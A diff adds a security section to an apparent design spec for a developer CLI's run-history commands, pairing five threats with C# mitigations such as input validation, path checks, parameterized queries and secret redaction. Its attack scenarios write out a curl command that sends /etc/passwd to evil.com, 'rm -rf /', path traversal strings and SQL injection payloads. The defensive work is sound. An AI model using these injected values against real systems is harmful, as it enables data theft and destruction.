@@ -667,6 +667,622 @@ hexdump -C .acode/artifacts/{run-id}/stdout.txt
 
 ---
 
+## Security Considerations
+
+### Threat 1: Command Injection via Malicious Run IDs
+
+**Risk:** If run IDs are passed unsanitized to shell commands (e.g., log readers, diff tools), attackers could inject shell commands. Example: run ID `run-123; rm -rf /` could execute destructive commands.
+
+**Attack Scenario:**
+1. Attacker controls run ID creation (malicious CI job, compromised API)
+2. Crafts run ID: `run-abc"; curl http://evil.com/exfiltrate?data=$(cat /etc/passwd) #`
+3. Developer runs: `acode runs logs "run-abc"; curl http://evil.com/..."`
+4. Shell interprets as two commands: log display + data exfiltration
+5. Sensitive data sent to attacker-controlled server
+
+**Mitigation (C# - RunIdValidator with Shell Safety):**
+
+```csharp
+namespace Acode.Application.Runs;
+
+public sealed class RunIdValidator
+{
+    private static readonly Regex ValidRunIdPattern = new(@"^run-[a-z0-9]{8,40}$", RegexOptions.Compiled);
+    private static readonly char[] ShellMetacharacters = new[]
+    {
+        ';', '|', '&', '$', '`', '\n', '\r', '(', ')', '<', '>',
+        '"', '\'', '\\', '*', '?', '[', ']', '{', '}', '~', '!'
+    };
+
+    public (bool IsValid, string Error) Validate(string runId)
+    {
+        // Rule 1: Not null or empty
+        if (string.IsNullOrWhiteSpace(runId))
+            return (false, "Run ID cannot be null or empty");
+
+        // Rule 2: Strict format (run-<alphanumeric>)
+        if (!ValidRunIdPattern.IsMatch(runId))
+            return (false, "Run ID must match format: run-[a-z0-9]{8,40}");
+
+        // Rule 3: No shell metacharacters (defense in depth)
+        if (runId.IndexOfAny(ShellMetacharacters) >= 0)
+            return (false, "Run ID contains forbidden shell metacharacters");
+
+        // Rule 4: Length bounds (prevent buffer overflow in native tools)
+        if (runId.Length < 12 || runId.Length > 50)
+            return (false, "Run ID length must be between 12 and 50 characters");
+
+        return (true, null);
+    }
+
+    public string Sanitize(string runId)
+    {
+        if (string.IsNullOrWhiteSpace(runId))
+            throw new ArgumentException("Run ID cannot be null", nameof(runId));
+
+        // Remove all non-alphanumeric except hyphen
+        var sanitized = Regex.Replace(runId, @"[^a-z0-9\-]", "", RegexOptions.IgnoreCase);
+
+        // Ensure starts with "run-"
+        if (!sanitized.StartsWith("run-", StringComparison.OrdinalIgnoreCase))
+            sanitized = "run-" + sanitized;
+
+        // Truncate if too long
+        if (sanitized.Length > 50)
+            sanitized = sanitized.Substring(0, 50);
+
+        return sanitized.ToLowerInvariant();
+    }
+}
+
+// Usage in RunsLogsCommand
+public class RunsLogsCommand
+{
+    private readonly RunIdValidator _validator;
+    private readonly IArtifactReader _reader;
+
+    public async Task<int> ExecuteAsync(string runId, bool follow)
+    {
+        // ALWAYS validate before ANY operations
+        var (isValid, error) = _validator.Validate(runId);
+        if (!isValid)
+        {
+            Console.Error.WriteLine($"Invalid run ID: {error}");
+            return 2;
+        }
+
+        // Never pass run ID to shell - use .NET APIs directly
+        var logPath = Path.Combine(".acode", "artifacts", runId, "stdout.txt");
+        await _reader.StreamFileAsync(logPath, follow, CancellationToken.None);
+        return 0;
+    }
+}
+```
+
+**Prevention:**
+- Validate run IDs against strict regex before ANY operations
+- Never construct shell commands with user input
+- Use .NET file/process APIs directly (no `Process.Start("/bin/sh", $"-c cat {runId}")`)
+
+---
+
+### Threat 2: Path Traversal in Artifact Log Display
+
+**Risk:** Malicious run IDs containing `../` sequences could read arbitrary files outside `.acode/artifacts/`. Example: `acode runs logs ../../../../etc/passwd` could expose sensitive system files.
+
+**Attack Scenario:**
+1. Attacker creates run with ID: `run-../../../../../../etc/passwd`
+2. Developer runs: `acode runs logs run-../../../../../../etc/passwd`
+3. Path constructed as: `.acode/artifacts/run-../../../../../../etc/passwd/stdout.txt`
+4. Resolves to: `/etc/passwd/stdout.txt` (or `/etc/passwd` if directory check missing)
+5. System password file displayed to attacker
+
+**Mitigation (C# - SafePathResolver):**
+
+```csharp
+namespace Acode.Infrastructure.Artifacts;
+
+public sealed class SafePathResolver
+{
+    private readonly string _artifactsRoot;
+
+    public SafePathResolver(string workspaceRoot)
+    {
+        _artifactsRoot = Path.GetFullPath(Path.Combine(workspaceRoot, ".acode", "artifacts"));
+    }
+
+    public (bool IsValid, string ResolvedPath, string Error) ResolveSafePath(string runId, string fileName)
+    {
+        // Step 1: Validate run ID format
+        if (string.IsNullOrWhiteSpace(runId) || runId.Contains("..") || runId.Contains("/") || runId.Contains("\\"))
+            return (false, null, "Run ID contains path traversal sequences");
+
+        // Step 2: Validate fileName (if provided)
+        if (!string.IsNullOrEmpty(fileName))
+        {
+            if (fileName.Contains("..") || Path.IsPathRooted(fileName))
+                return (false, null, "File name contains path traversal or absolute path");
+        }
+
+        // Step 3: Construct path using safe combination
+        var runDirectory = Path.Combine(_artifactsRoot, runId);
+        var fullPath = string.IsNullOrEmpty(fileName)
+            ? runDirectory
+            : Path.Combine(runDirectory, fileName);
+
+        // Step 4: Resolve to absolute path (normalizes .. sequences)
+        var resolvedPath = Path.GetFullPath(fullPath);
+
+        // Step 5: CRITICAL - Verify resolved path is still within artifacts root
+        if (!resolvedPath.StartsWith(_artifactsRoot, StringComparison.OrdinalIgnoreCase))
+            return (false, null, $"Path escapes artifacts directory: {resolvedPath}");
+
+        // Step 6: Verify path exists before returning
+        if (!File.Exists(resolvedPath) && !Directory.Exists(resolvedPath))
+            return (false, null, $"Path does not exist: {resolvedPath}");
+
+        return (true, resolvedPath, null);
+    }
+}
+
+// Usage in ArtifactReader
+public class ArtifactReader : IArtifactReader
+{
+    private readonly SafePathResolver _pathResolver;
+
+    public async Task<string> ReadLogAsync(string runId, string logType)
+    {
+        var fileName = logType switch
+        {
+            "stdout" => "stdout.txt",
+            "stderr" => "stderr.txt",
+            _ => throw new ArgumentException($"Invalid log type: {logType}")
+        };
+
+        // Resolve path safely - NEVER concatenate strings directly
+        var (isValid, path, error) = _pathResolver.ResolveSafePath(runId, fileName);
+        if (!isValid)
+            throw new SecurityException($"Path traversal attempt blocked: {error}");
+
+        // Safe to read - path is guaranteed within artifacts directory
+        return await File.ReadAllTextAsync(path);
+    }
+}
+```
+
+**Prevention:**
+- Always use `Path.GetFullPath()` to normalize paths
+- Verify resolved paths start with expected root directory
+- Never concatenate user input directly into file paths
+
+---
+
+### Threat 3: Sensitive Data Leakage in Run Diff Output
+
+**Risk:** Diff command may expose secrets (API keys, passwords, tokens) when comparing runs with different environment variables or config files. Secrets intended for redaction in logs may bypass redaction in diff output.
+
+**Attack Scenario:**
+1. Developer compares two runs: `acode runs diff run-prod-deploy run-staging-deploy`
+2. Diff includes environment variables section
+3. Output shows:
+   ```diff
+   - API_KEY=sk-staging-abc123def456
+   + API_KEY=sk-prod-xyz789ghi012
+   ```
+4. Production API key exposed in terminal, scrollback buffer, screen share
+5. Attacker with screen recording access obtains production credentials
+
+**Mitigation (C# - SecureRunDiffer with Redaction):**
+
+```csharp
+namespace Acode.Application.Runs;
+
+public sealed class SecureRunDiffer
+{
+    private static readonly Regex[] SecretPatterns = new[]
+    {
+        new Regex(@"(?i)(api[_-]?key|password|secret|token|credential)[:=]\s*[^\s]{8,}", RegexOptions.Compiled),
+        new Regex(@"sk-[a-zA-Z0-9]{48,}", RegexOptions.Compiled), // OpenAI keys
+        new Regex(@"ghp_[a-zA-Z0-9]{36,}", RegexOptions.Compiled), // GitHub tokens
+        new Regex(@"Bearer\s+[a-zA-Z0-9\-._~+/]+=*", RegexOptions.Compiled), // Bearer tokens
+        new Regex(@"-----BEGIN\s+(RSA\s+)?PRIVATE\s+KEY-----", RegexOptions.Compiled) // Private keys
+    };
+
+    private readonly IRunRepository _repository;
+
+    public async Task<DiffResult> DiffRunsAsync(string runId1, string runId2, DiffOptions options)
+    {
+        var run1 = await _repository.GetByIdAsync(runId1);
+        var run2 = await _repository.GetByIdAsync(runId2);
+
+        if (run1 == null || run2 == null)
+            throw new NotFoundException("One or both run IDs not found");
+
+        var diff = new DiffResult
+        {
+            RunId1 = runId1,
+            RunId2 = runId2,
+            Timestamp = DateTime.UtcNow
+        };
+
+        // Compare metadata (safe fields only)
+        diff.MetadataDiff = CompareMetadata(run1, run2);
+
+        // Compare environment (WITH REDACTION)
+        diff.EnvironmentDiff = CompareEnvironmentSecurely(
+            run1.Environment,
+            run2.Environment,
+            redactSecrets: !options.NoRedaction // Default to redaction
+        );
+
+        // Compare artifacts (sizes only, not content, unless explicitly requested)
+        diff.ArtifactsDiff = CompareArtifacts(run1.Artifacts, run2.Artifacts);
+
+        return diff;
+    }
+
+    private Dictionary<string, string> CompareEnvironmentSecurely(
+        Dictionary<string, string> env1,
+        Dictionary<string, string> env2,
+        bool redactSecrets)
+    {
+        var diff = new Dictionary<string, string>();
+
+        // Keys only in env1
+        foreach (var key in env1.Keys.Except(env2.Keys))
+        {
+            var value = redactSecrets ? RedactIfSecret(key, env1[key]) : env1[key];
+            diff[$"- {key}"] = value;
+        }
+
+        // Keys only in env2
+        foreach (var key in env2.Keys.Except(env1.Keys))
+        {
+            var value = redactSecrets ? RedactIfSecret(key, env2[key]) : env2[key];
+            diff[$"+ {key}"] = value;
+        }
+
+        // Keys in both but with different values
+        foreach (var key in env1.Keys.Intersect(env2.Keys))
+        {
+            if (env1[key] != env2[key])
+            {
+                var oldValue = redactSecrets ? RedactIfSecret(key, env1[key]) : env1[key];
+                var newValue = redactSecrets ? RedactIfSecret(key, env2[key]) : env2[key];
+                diff[$"~ {key}"] = $"{oldValue} → {newValue}";
+            }
+        }
+
+        return diff;
+    }
+
+    private string RedactIfSecret(string key, string value)
+    {
+        // Redact by key name patterns
+        if (Regex.IsMatch(key, @"(?i)(key|password|secret|token|credential)"))
+            return "***REDACTED***";
+
+        // Redact by value patterns
+        foreach (var pattern in SecretPatterns)
+        {
+            if (pattern.IsMatch(value))
+                return "***REDACTED***";
+        }
+
+        return value;
+    }
+}
+
+// DiffOptions
+public class DiffOptions
+{
+    public bool NoRedaction { get; set; } = false; // Requires explicit opt-in
+    public bool ShowArtifactContent { get; set; } = false;
+    public bool ColorOutput { get; set; } = true;
+}
+```
+
+**Prevention:**
+- Redact secrets by default in all output (opt-in to show)
+- Use pattern matching to detect secrets (keys, tokens, passwords)
+- Require explicit `--no-redaction` flag with confirmation prompt
+
+---
+
+### Threat 4: SQL Injection in Run List Filters
+
+**Risk:** If filter parameters (--task, --status, --user) are concatenated directly into SQL queries, attackers could inject SQL to read/modify database. Example: `--task "build'; DROP TABLE runs; --"` could destroy data.
+
+**Attack Scenario:**
+1. Attacker provides malicious task filter: `acode runs list --task "test' OR '1'='1"`
+2. Application constructs query: `SELECT * FROM runs WHERE task='test' OR '1'='1'`
+3. Condition `'1'='1'` is always true, bypassing filter
+4. All runs returned, including sensitive internal runs
+5. Attacker escalates to: `--task "x'; UPDATE runs SET status='failed'; --"`
+6. All runs marked as failed, breaking CI/CD pipeline
+
+**Mitigation (C# - Parameterized Queries with RunQueryBuilder):**
+
+```csharp
+namespace Acode.Infrastructure.Persistence;
+
+public sealed class RunRepository : IRunRepository
+{
+    private readonly IDbConnection _db;
+
+    public async Task<List<RunRecord>> ListAsync(RunListFilters filters)
+    {
+        // NEVER concatenate user input into SQL strings
+        var query = new RunQueryBuilder()
+            .Select("id", "task", "status", "exit_code", "started_at", "duration_ms")
+            .From("runs")
+            .ApplyFilters(filters) // Safe filter application
+            .OrderBy(filters.SortBy, filters.SortOrder)
+            .Limit(filters.Limit)
+            .Offset(filters.Offset)
+            .Build();
+
+        // Execute with parameters (prevents SQL injection)
+        return (await _db.QueryAsync<RunRecord>(query.Sql, query.Parameters)).ToList();
+    }
+}
+
+public class RunQueryBuilder
+{
+    private readonly StringBuilder _sql = new();
+    private readonly Dictionary<string, object> _parameters = new();
+    private int _paramCounter = 0;
+
+    public RunQueryBuilder Select(params string[] columns)
+    {
+        // Whitelist columns (no user input in column names)
+        var allowedColumns = new HashSet<string>
+        {
+            "id", "task", "status", "exit_code", "started_at", "duration_ms", "user"
+        };
+
+        var safeColumns = columns.Where(c => allowedColumns.Contains(c)).ToArray();
+        _sql.Append($"SELECT {string.Join(", ", safeColumns)} ");
+        return this;
+    }
+
+    public RunQueryBuilder From(string table)
+    {
+        // Hardcoded table name (no user input)
+        _sql.Append("FROM runs ");
+        return this;
+    }
+
+    public RunQueryBuilder ApplyFilters(RunListFilters filters)
+    {
+        var whereClauses = new List<string>();
+
+        // Filter: task (parameterized)
+        if (!string.IsNullOrEmpty(filters.Task))
+        {
+            var paramName = $"@p{_paramCounter++}";
+            whereClauses.Add($"task = {paramName}");
+            _parameters[paramName] = filters.Task; // Safe - uses parameter binding
+        }
+
+        // Filter: status (enum validation + parameterized)
+        if (filters.Status.HasValue)
+        {
+            var paramName = $"@p{_paramCounter++}";
+            whereClauses.Add($"status = {paramName}");
+            _parameters[paramName] = filters.Status.Value.ToString(); // Enum - safe
+        }
+
+        // Filter: user (parameterized)
+        if (!string.IsNullOrEmpty(filters.User))
+        {
+            var paramName = $"@p{_paramCounter++}";
+            whereClauses.Add($"user = {paramName}");
+            _parameters[paramName] = filters.User;
+        }
+
+        // Filter: date range (parameterized)
+        if (filters.StartedAfter.HasValue)
+        {
+            var paramName = $"@p{_paramCounter++}";
+            whereClauses.Add($"started_at >= {paramName}");
+            _parameters[paramName] = filters.StartedAfter.Value;
+        }
+
+        if (whereClauses.Any())
+            _sql.Append($"WHERE {string.Join(" AND ", whereClauses)} ");
+
+        return this;
+    }
+
+    public RunQueryBuilder OrderBy(string column, SortOrder order)
+    {
+        // Whitelist sort columns
+        var allowedColumns = new HashSet<string> { "id", "started_at", "duration_ms", "task" };
+        if (!allowedColumns.Contains(column))
+            column = "started_at"; // Default
+
+        var direction = order == SortOrder.Ascending ? "ASC" : "DESC";
+        _sql.Append($"ORDER BY {column} {direction} ");
+        return this;
+    }
+
+    public RunQueryBuilder Limit(int limit)
+    {
+        // Validate and cap limit
+        if (limit < 1) limit = 50;
+        if (limit > 1000) limit = 1000;
+
+        var paramName = $"@p{_paramCounter++}";
+        _sql.Append($"LIMIT {paramName} ");
+        _parameters[paramName] = limit;
+        return this;
+    }
+
+    public (string Sql, Dictionary<string, object> Parameters) Build()
+    {
+        return (_sql.ToString(), _parameters);
+    }
+}
+```
+
+**Prevention:**
+- ALWAYS use parameterized queries (never string concatenation)
+- Whitelist column names for SELECT and ORDER BY
+- Validate enums before use in queries
+- Cap LIMIT to reasonable maximum (prevent resource exhaustion)
+
+---
+
+### Threat 5: Redaction Bypass via Output Format Switching
+
+**Risk:** Secrets redacted in terminal output (ANSI color codes, truncation) may be fully exposed when switching to JSON or YAML output formats. Developers unaware of this may inadvertently log or share sensitive data.
+
+**Attack Scenario:**
+1. Developer views run: `acode runs show run-prod-deploy` (terminal output)
+2. Terminal output redacts environment: `API_KEY=***REDACTED***`
+3. Developer pipes to JSON for scripting: `acode runs show run-prod-deploy --format json > run.json`
+4. JSON contains full unredacted secrets: `"API_KEY": "sk-prod-abc123..."`
+5. `run.json` committed to git, shared in Slack, or uploaded to issue tracker
+6. Secrets exposed to entire team or public repository
+
+**Mitigation (C# - FormatAwareRedactor):**
+
+```csharp
+namespace Acode.Application.Runs;
+
+public sealed class RunShowCommand
+{
+    private readonly IRunRepository _repository;
+    private readonly ISecretRedactor _redactor;
+
+    public async Task<int> ExecuteAsync(string runId, OutputFormat format, bool noRedaction)
+    {
+        var run = await _repository.GetByIdAsync(runId);
+        if (run == null)
+        {
+            Console.Error.WriteLine($"Run not found: {runId}");
+            return 1;
+        }
+
+        // CRITICAL: Apply redaction BEFORE formatting (not after)
+        var redactedRun = noRedaction ? run : _redactor.RedactSecrets(run);
+
+        // Warn user if showing unredacted in non-terminal formats
+        if (noRedaction && format != OutputFormat.Terminal)
+        {
+            Console.Error.WriteLine("⚠️  WARNING: --no-redaction with JSON/YAML output exposes secrets!");
+            Console.Error.Write("Are you sure you want to continue? (yes/no): ");
+            var confirmation = Console.ReadLine();
+            if (confirmation?.ToLowerInvariant() != "yes")
+            {
+                Console.WriteLine("Cancelled.");
+                return 0;
+            }
+        }
+
+        // Format output
+        var output = format switch
+        {
+            OutputFormat.Terminal => FormatForTerminal(redactedRun),
+            OutputFormat.Json => JsonSerializer.Serialize(redactedRun, new JsonSerializerOptions { WriteIndented = true }),
+            OutputFormat.Yaml => YamlSerializer.Serialize(redactedRun),
+            _ => throw new ArgumentException($"Unsupported format: {format}")
+        };
+
+        Console.WriteLine(output);
+        return 0;
+    }
+
+    private string FormatForTerminal(RunRecord run)
+    {
+        var sb = new StringBuilder();
+        sb.AppendLine($"Run ID: {run.Id}");
+        sb.AppendLine($"Task: {run.Task}");
+        sb.AppendLine($"Status: {run.Status}");
+        sb.AppendLine($"Exit Code: {run.ExitCode}");
+        sb.AppendLine($"Duration: {run.DurationMs}ms");
+        sb.AppendLine();
+        sb.AppendLine("Environment:");
+        foreach (var (key, value) in run.Environment)
+        {
+            // Redacted values already replaced, safe to display
+            sb.AppendLine($"  {key}={value}");
+        }
+        return sb.ToString();
+    }
+}
+
+public interface ISecretRedactor
+{
+    RunRecord RedactSecrets(RunRecord run);
+}
+
+public class SecretRedactor : ISecretRedactor
+{
+    private static readonly Regex[] SecretPatterns = new[]
+    {
+        new Regex(@"(?i)(api[_-]?key|password|secret|token|credential)[:=]\s*[^\s]{8,}", RegexOptions.Compiled),
+        new Regex(@"sk-[a-zA-Z0-9]{48,}", RegexOptions.Compiled),
+        new Regex(@"ghp_[a-zA-Z0-9]{36,}", RegexOptions.Compiled),
+        new Regex(@"-----BEGIN\s+(RSA\s+)?PRIVATE\s+KEY-----", RegexOptions.Compiled)
+    };
+
+    public RunRecord RedactSecrets(RunRecord run)
+    {
+        // Deep clone to avoid modifying original
+        var redacted = run.Clone();
+
+        // Redact environment variables
+        redacted.Environment = redacted.Environment
+            .ToDictionary(
+                kvp => kvp.Key,
+                kvp => RedactValue(kvp.Key, kvp.Value)
+            );
+
+        // Redact command arguments if present
+        if (!string.IsNullOrEmpty(redacted.Command))
+            redacted.Command = RedactCommandLine(redacted.Command);
+
+        return redacted;
+    }
+
+    private string RedactValue(string key, string value)
+    {
+        // Redact by key name
+        if (Regex.IsMatch(key, @"(?i)(key|password|secret|token|credential)"))
+            return "***REDACTED***";
+
+        // Redact by value pattern
+        foreach (var pattern in SecretPatterns)
+        {
+            if (pattern.IsMatch(value))
+                return "***REDACTED***";
+        }
+
+        return value;
+    }
+
+    private string RedactCommandLine(string command)
+    {
+        // Redact anything after --password, --token, etc.
+        return Regex.Replace(
+            command,
+            @"(?i)(--?(?:password|token|key|secret)[\s=]+)([^\s]+)",
+            "$1***REDACTED***"
+        );
+    }
+}
+```
+
+**Prevention:**
+- Apply redaction BEFORE formatting (not in formatter)
+- Require explicit confirmation for `--no-redaction` with JSON/YAML
+- Warn users about secret exposure risk in non-terminal formats
+- Make redaction the default (opt-out, not opt-in)
+
+---
+
 ## Best Practices
 
 ### Command Design
